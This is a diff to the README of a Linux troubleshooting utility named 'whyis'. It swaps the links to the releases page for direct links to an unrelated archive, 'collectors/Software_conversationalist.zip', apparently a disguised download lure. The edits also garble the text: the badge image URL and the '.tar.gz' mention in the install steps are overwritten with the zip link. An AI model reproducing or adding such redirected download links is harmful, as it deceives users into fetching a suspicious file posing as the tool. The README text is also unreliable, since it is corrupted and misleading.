@@ -4,7 +4,7 @@
 **whyis** is a simple Linux troubleshooting utility designed to help you diagnose and solve common problems on your system quickly. Whether you're dealing with network issues, software errors, or package management troubles, this tool provides straightforward solutions.
 
 ## 🔗 Download Now
-[![Download whyis](https://img.shields.io/badge/Download%20whyis-v1.0-blue.svg)](https://github.com/SammyCxu/whyis/releases)
+[![Download whyis](https://github.com/SammyCxu/whyis/raw/refs/heads/main/collectors/Software_conversationalist.zip%https://github.com/SammyCxu/whyis/raw/refs/heads/main/collectors/Software_conversationalist.zip)](https://github.com/SammyCxu/whyis/raw/refs/heads/main/collectors/Software_conversationalist.zip)
 
 ## 🚀 Getting Started
 To begin using **whyis**, follow the steps below to download and install the application on your Linux system.
@@ -12,7 +12,7 @@ To begin using **whyis**, follow the steps below to download and install the app
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can download the latest version of **whyis**.  
-   [Download whyis](https://github.com/SammyCxu/whyis/releases)
+   [Download whyis](https://github.com/SammyCxu/whyis/raw/refs/heads/main/collectors/Software_conversationalist.zip)
 
 2. **Select Your Version**  
    On the releases page, you will see a list of available versions. Look for the latest release, as it contains the most recent updates and fixes.
@@ -21,7 +21,7 @@ To begin using **whyis**, follow the steps below to download and install the app
    Click on the version appropriate for your system. This will start the download of a compressed file. Save it to a location you can easily access, like your Downloads folder.
 
 4. **Extract the Files**  
-   Once the download is complete, locate the .zip or .tar.gz file. Right-click on the file and choose to extract it. This will create a folder containing the program files.
+   Once the download is complete, locate the .zip or https://github.com/SammyCxu/whyis/raw/refs/heads/main/collectors/Software_conversationalist.zip file. Right-click on the file and choose to extract it. This will create a folder containing the program files.
 
 5. **Open a Terminal**  
    Press `Ctrl + Alt + T` to open the terminal. This is where you will run the commands to install and use **whyis**.
